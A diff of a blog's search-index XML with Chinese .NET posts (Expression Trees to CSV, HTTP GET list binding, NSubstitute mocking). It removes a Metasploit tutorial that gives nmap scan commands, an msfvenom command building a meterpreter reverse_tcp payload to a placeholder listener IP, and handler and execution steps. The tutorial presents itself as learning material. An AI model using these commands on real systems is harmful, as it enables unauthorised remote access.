 </div>]]></content>
       <categories>
         <category>.Net</category>
       </categories>
       <tags>
+        <tag>Linux</tag>
+        <tag>Font</tag>
         <tag>.Net</tag>
-        <tag>Expression</tag>
+        <tag>Big5</tag>
+        <tag>Unicode</tag>
       </tags>
   </entry>
   <entry>
@@ -1626,18 +1598,23 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
-    <title>Http 的 Get 方法傳入 List 參數</title>
-    <url>/2023/01/21/NetHttpGetWithList/</url>
-    <content><![CDATA[<h1 id="建立類別"><a class="header-anchor" href="#建立類別"></a>建立類別</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>使用 Expression Trees 把 List&lt;T&gt; 轉成 CSV 字串</title>
+    <url>/2024/05/01/NetExpressionListToCsv/</url>
+    <content><![CDATA[<h1 id="宣告類別"><a class="header-anchor" href="#宣告類別"></a>宣告類別</h1>
+<p>類別內容如下</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>List 內容如下</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;User&gt; users = <span class="keyword">new</span> List&lt;User&gt;&#123;</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test1&quot;</span>,</span><br><span class="line">        Age = <span class="number">10</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test2&quot;</span>,</span><br><span class="line">        Age = <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
-<h1 id="建立-HttpGet-方法"><a class="header-anchor" href="#建立-HttpGet-方法"></a>建立 HttpGet 方法</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line">[<span class="meta">Route(<span class="string">&quot;[controller]&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">  [<span class="meta">HttpGet</span>]</span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">Get</span>(<span class="params">[FromQuery] List&lt;User&gt; user</span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">return</span> user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="組合-Request-的-Url"><a class="header-anchor" href="#組合-Request-的-Url"></a>組合 Request 的 Url</h1>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">https://example.com/User?user[0].Name=&#x27;張三&#x27;&amp;user[0].Age=10&amp;user[1].Name=&#x27;李四&#x27;&amp;user[1].Age=20</span><br></pre></td></tr></table></figure>
+<h1 id="產生-Expression-表達式"><a class="header-anchor" href="#產生-Expression-表達式"></a>產生 Expression 表達式</h1>
+<p>建立轉換方法</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Linq.Expressions;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title">List</span>&lt;<span class="title">string</span>&gt; <span class="title">selectToCsv</span>&lt;<span class="title">T</span>&gt;(<span class="params"><span class="keyword">this</span> List&lt;T&gt; list, <span class="built_in">string</span> delimiter</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Type source = <span class="keyword">typeof</span>(T);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得類別欄位</span></span><br><span class="line">    PropertyInfo[] prop = source.GetProperties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 類別使用 t 表達 </span></span><br><span class="line">    ParameterExpression t = Expression.Parameter(source, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得轉成字串方法</span></span><br><span class="line">    MethodInfo toString = <span class="keyword">typeof</span>(<span class="built_in">object</span>).GetMethod(<span class="string">&quot;ToString&quot;</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;ConditionalExpression&gt; parameters = <span class="keyword">new</span> List&lt;ConditionalExpression&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (PropertyInfo p <span class="keyword">in</span> prop)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 類別欄位使用 t.Name, t.Age 表達</span></span><br><span class="line">        MemberExpression propertyValue = Expression.PropertyOrField(t, p.Name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位進行字串轉換 t.Name.ToString(), t.Age.ToString()</span></span><br><span class="line">        MethodCallExpression propertyToString = Expression.Call(propertyValue, toString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// NULL 值</span></span><br><span class="line">        ConstantExpression constantNull = Expression.Constant(<span class="literal">null</span>, <span class="keyword">typeof</span>(<span class="built_in">object</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位需進行字串轉換後，在做 NULL 判斷</span></span><br><span class="line">        BinaryExpression isNull = Expression.Equal(propertyToString, constantNull);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p.PropertyType == <span class="keyword">typeof</span>(<span class="built_in">string</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 字串型別欄位直接進行 NULL 判斷</span></span><br><span class="line">            isNull = Expression.Equal(propertyValue, constantNull);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 空字串值</span></span><br><span class="line">        ConstantExpression constantEmpty = Expression.Constant(<span class="built_in">string</span>.Empty, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// IIF 判斷 t.Name == null ? &quot;&quot; : t.Name.ToString()</span></span><br><span class="line">        ConditionalExpression ternary = Expression.Condition(isNull, constantEmpty, propertyToString);</span><br><span class="line"></span><br><span class="line">        parameters.Add(ternary);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 取得 Format 方法</span></span><br><span class="line">    MethodInfo formatMethod = <span class="keyword">typeof</span>(<span class="built_in">string</span>).GetMethod(<span class="string">&quot;Format&quot;</span>, BindingFlags.Static | BindingFlags.Public, <span class="literal">null</span>, <span class="keyword">new</span>[] &#123; <span class="keyword">typeof</span>(<span class="built_in">string</span>), <span class="keyword">typeof</span>(<span class="built_in">object</span>[]) &#125;, <span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 產生類別欄位序號模板清單 [ &#123;0&#125;, &#123;1&#125; ]</span></span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; formatStrings = Enumerable.Range(<span class="number">0</span>, prop.Length).Select(count =&gt; <span class="string">$&quot;&#123;&#123;<span class="subst">&#123;count&#125;</span>&#125;&#125;&quot;</span>).ToList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用符號 | 串聯成字串 &quot;&#123;0&#125;|&#123;1&#125;&quot;</span></span><br><span class="line">    ConstantExpression formatConstantExpression = Expression.Constant(<span class="built_in">string</span>.Join(delimiter, formatStrings));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生類別欄位轉換陣列</span></span><br><span class="line">    NewArrayExpression formatObjsExpression = Expression.NewArrayInit(<span class="keyword">typeof</span>(<span class="built_in">string</span>), parameters);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生 lambda 表達式</span></span><br><span class="line">    Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt; lambda = (Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt;)Expression.Lambda(Expression.Call(formatMethod, formatConstantExpression, formatObjsExpression), t);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// t =&gt; Format(&quot;&#123;0&#125;|&#123;1&#125;&quot;, new [] &#123;IIF((t.Name == null), &quot;&quot;, t.Name.ToString()), IIF((t.Age.ToString() == null), &quot;&quot;, t.Age.ToString())&#125;)</span></span><br><span class="line"></span><br><span class="line">    IQueryable&lt;T&gt; queryable = list.AsQueryable();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queryable.Select(lambda).ToList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h1>
+<p>執行方法轉換出 CSV 列表</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;<span class="built_in">string</span>&gt; csvList = users.selectToCsv(<span class="string">&quot;|&quot;</span>);</span><br></pre></td></tr></table></figure>
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
-<li><a href="https://stackoverflow.com/questions/3061273/send-an-array-with-an-http-get">Send an Array with an HTTP Get</a></li>
+<li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/advanced-topics/expression-trees/">Expression Trees</a></li>
 </ol>
 </div>]]></content>
       <categories>
@@ -1645,7 +1622,7 @@ dotnet-dump collect --process-id 1902 -->
       </categories>
       <tags>
         <tag>.Net</tag>
-        <tag>Http</tag>
+        <tag>Expression</tag>
       </tags>
   </entry>
   <entry>
@@ -1674,6 +1651,29 @@ dotnet-dump collect --process-id 1902 -->
         <tag>JSON</tag>
         <tag>.Net</tag>
         <tag>Polyglot Notebooks</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Http 的 Get 方法傳入 List 參數</title>
+    <url>/2023/01/21/NetHttpGetWithList/</url>
+    <content><![CDATA[<h1 id="建立類別"><a class="header-anchor" href="#建立類別"></a>建立類別</h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="建立-HttpGet-方法"><a class="header-anchor" href="#建立-HttpGet-方法"></a>建立 HttpGet 方法</h1>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">ApiController</span>]</span><br><span class="line">[<span class="meta">Route(<span class="string">&quot;[controller]&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">  [<span class="meta">HttpGet</span>]</span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">Get</span>(<span class="params">[FromQuery] List&lt;User&gt; user</span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">return</span> user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="組合-Request-的-Url"><a class="header-anchor" href="#組合-Request-的-Url"></a>組合 Request 的 Url</h1>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">https://example.com/User?user[0].Name=&#x27;張三&#x27;&amp;user[0].Age=10&amp;user[1].Name=&#x27;李四&#x27;&amp;user[1].Age=20</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://stackoverflow.com/questions/3061273/send-an-array-with-an-http-get">Send an Array with an HTTP Get</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>.Net</category>
+      </categories>
+      <tags>
+        <tag>.Net</tag>
+        <tag>Http</tag>
       </tags>
   </entry>
   <entry>
@@ -1756,44 +1756,6 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
-    <title>如何在商業邏輯層進行單元測試</title>
-    <url>/2022/05/01/NetServiceUnitTest/</url>
-    <content><![CDATA[<h1 id="安裝-NSubstitute"><a class="header-anchor" href="#安裝-NSubstitute"></a>安裝 NSubstitute</h1>
-<p>安裝 Nuget 的 NSubstitute 套件</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Package</span> NSubstitute</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="類別結構"><a class="header-anchor" href="#類別結構"></a>類別結構</h1>
-<img  src=http://www.plantuml.com/plantuml/svg/LO_T2e9044RlvoackYd8G2z55YiXWgwi5nYt8HTqNTOnwErRfH-x_iuvyEMza9UXRM0XDRUClIFD3LK0BWn66qTMyCB-OJHZbk7gi5dkYYBU9sii1tlkxaQZKlzyoQxhZNJ-EIcddt9aAKXeCZxLIAcPaMAy7SjV562MYqRuBQQO199by1QlL3MC8m-Gixs5Ioy0>
-<h1 id="建立模擬物件"><a class="header-anchor" href="#建立模擬物件"></a>建立模擬物件</h1>
-<p>建立 Repository 的模擬物件</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Repository mockRepository = Substitute.For&lt;Repository&gt;();</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<h1 id="注入模擬物件"><a class="header-anchor" href="#注入模擬物件"></a>注入模擬物件</h1>
-<p>把 Repository 的模擬物件注入 Service</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Service service = <span class="keyword">new</span> Service(mockRepository);</span><br></pre></td></tr></table></figure>
-<p>使用 Service</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Table result = service.RunLogic();</span><br><span class="line"></span><br><span class="line">Assert.That(result.Name, Is.EqualTo(<span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
-<h1 id="驗證模擬物件"><a class="header-anchor" href="#驗證模擬物件"></a>驗證模擬物件</h1>
-<p>依傳入參數做回傳</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;張三&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;李四&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">2</span>,</span><br><span class="line">    Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>模擬呼叫方法多次依序回傳不同內容</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">1</span>,</span><br><span class="line">        Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">2</span>,</span><br><span class="line">        Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
-<p>驗證呼叫方法的次數與傳入參數</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.Received(<span class="number">1</span>)</span><br><span class="line">.GetData(Arg.Is&lt;<span class="built_in">string</span>&gt;(x =&gt; x == <span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://nsubstitute.github.io/help.html">NSubstitute文件</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>.Net</category>
-      </categories>
-      <tags>
-        <tag>.Net</tag>
-        <tag>UnitTest</tag>
-        <tag>NSubstitute</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用 ScottPlot 繪製圖表</title>
     <url>/2024/06/01/NetScottPlot/</url>
     <content><![CDATA[<h1 id="初始化設定"><a class="header-anchor" href="#初始化設定"></a>初始化設定</h1>
@@ -1870,6 +1832,44 @@ dotnet-dump collect --process-id 1902 -->
         <tag>XML</tag>
         <tag>.Net</tag>
         <tag>Polyglot Notebooks</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何在商業邏輯層進行單元測試</title>
+    <url>/2022/05/01/NetServiceUnitTest/</url>
+    <content><![CDATA[<h1 id="安裝-NSubstitute"><a class="header-anchor" href="#安裝-NSubstitute"></a>安裝 NSubstitute</h1>
+<p>安裝 Nuget 的 NSubstitute 套件</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Package</span> NSubstitute</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="類別結構"><a class="header-anchor" href="#類別結構"></a>類別結構</h1>
+<img  src=http://www.plantuml.com/plantuml/svg/LO_T2e9044RlvoackYd8G2z55YiXWgwi5nYt8HTqNTOnwErRfH-x_iuvyEMza9UXRM0XDRUClIFD3LK0BWn66qTMyCB-OJHZbk7gi5dkYYBU9sii1tlkxaQZKlzyoQxhZNJ-EIcddt9aAKXeCZxLIAcPaMAy7SjV562MYqRuBQQO199by1QlL3MC8m-Gixs5Ioy0>
+<h1 id="建立模擬物件"><a class="header-anchor" href="#建立模擬物件"></a>建立模擬物件</h1>
+<p>建立 Repository 的模擬物件</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Repository mockRepository = Substitute.For&lt;Repository&gt;();</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h1 id="注入模擬物件"><a class="header-anchor" href="#注入模擬物件"></a>注入模擬物件</h1>
+<p>把 Repository 的模擬物件注入 Service</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Service service = <span class="keyword">new</span> Service(mockRepository);</span><br></pre></td></tr></table></figure>
+<p>使用 Service</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Table result = service.RunLogic();</span><br><span class="line"></span><br><span class="line">Assert.That(result.Name, Is.EqualTo(<span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
+<h1 id="驗證模擬物件"><a class="header-anchor" href="#驗證模擬物件"></a>驗證模擬物件</h1>
+<p>依傳入參數做回傳</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;張三&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">1</span>,</span><br><span class="line">    Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mockRepository</span><br><span class="line">.GetData(<span class="string">&quot;李四&quot;</span>)</span><br><span class="line">.Returns(<span class="keyword">new</span> Table &#123;</span><br><span class="line">    Id = <span class="number">2</span>,</span><br><span class="line">    Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>模擬呼叫方法多次依序回傳不同內容</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.GetData(Arg.Any&lt;<span class="built_in">string</span>&gt;())</span><br><span class="line">.Returns(</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">1</span>,</span><br><span class="line">        Name = <span class="string">&quot;張三&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> Table</span><br><span class="line">    &#123;</span><br><span class="line">        Id = <span class="number">2</span>,</span><br><span class="line">        Name = <span class="string">&quot;李四&quot;</span></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p>驗證呼叫方法的次數與傳入參數</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">mockRepository</span><br><span class="line">.Received(<span class="number">1</span>)</span><br><span class="line">.GetData(Arg.Is&lt;<span class="built_in">string</span>&gt;(x =&gt; x == <span class="string">&quot;張三&quot;</span>));</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://nsubstitute.github.io/help.html">NSubstitute文件</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>.Net</category>
+      </categories>
+      <tags>
+        <tag>.Net</tag>
+        <tag>UnitTest</tag>
+        <tag>NSubstitute</tag>
       </tags>
   </entry>
   <entry>
@@ -2345,76 +2345,6 @@ k6 run --stage 30s:10 test.js;
       </tags>
   </entry>
   <entry>
-    <title>Metasploit 基本操作</title>
-    <url>/2024/06/01/ToolSecurityMetasploit/</url>
-    <content><![CDATA[<div class="note danger"><p>⚠️ 請注意，本範例僅供學習參考，請遵守相關法令，產生之行為與後果將由使用者自行負責</p>
-</div>
-<!-- 設定檔位置: ~/.msf4 -->
-<h1 id="開啟-Metasploit-Console"><a class="header-anchor" href="#開啟-Metasploit-Console"></a>開啟 Metasploit Console</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line"><span class="comment"># 資料庫設定: /home/[user]/.msf4/database.yml</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新設定</span></span><br><span class="line">msfdb reinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立資料庫連線</span></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止資料庫連線</span></span><br><span class="line">msfdb stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
-<h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新 nmap</span></span><br><span class="line">db_nmap --script-updatedb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 script 掃描漏洞</span></span><br><span class="line"><span class="comment"># script 路徑: /usr/share/nmap/scripts</span></span><br><span class="line">db_nmap -sV --script [漏洞script檔] [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
-<h1 id="模組查詢"><a class="header-anchor" href="#模組查詢"></a>模組查詢</h1>
-<p>⭐ 更新可用模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
-<p>⭐ 顯示可用模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用於繞過防毒軟體或安全防護機制的技術</span></span><br><span class="line">show evasion</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於取得會話後，在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br></pre></td></tr></table></figure>
-<p>⭐ 查找模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
-<p>⭐ 模組使用</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h1 id="滲透操作"><a class="header-anchor" href="#滲透操作"></a>滲透操作</h1>
-<p>⭐ 常用會話接口介紹</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">接口</th>
-<th style="text-align:left">說明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">command shell</td>
-<td style="text-align:left">獲得一個命令行界面，允許攻擊者在目標系統上執行命令</td>
-</tr>
-<tr>
-<td style="text-align:left">meterpreter</td>
-<td style="text-align:left">一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等</td>
-</tr>
-<tr>
-<td style="text-align:left">vnc</td>
-<td style="text-align:left">在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面</td>
-</tr>
-</tbody>
-</table>
-<p>⭐ 創建 meterpreter 會話接口的 payload :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
-<p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p>⭐ 遠端執行 meterpreter payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
-<h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
-<p>獲得會話接口後常用命令</p>
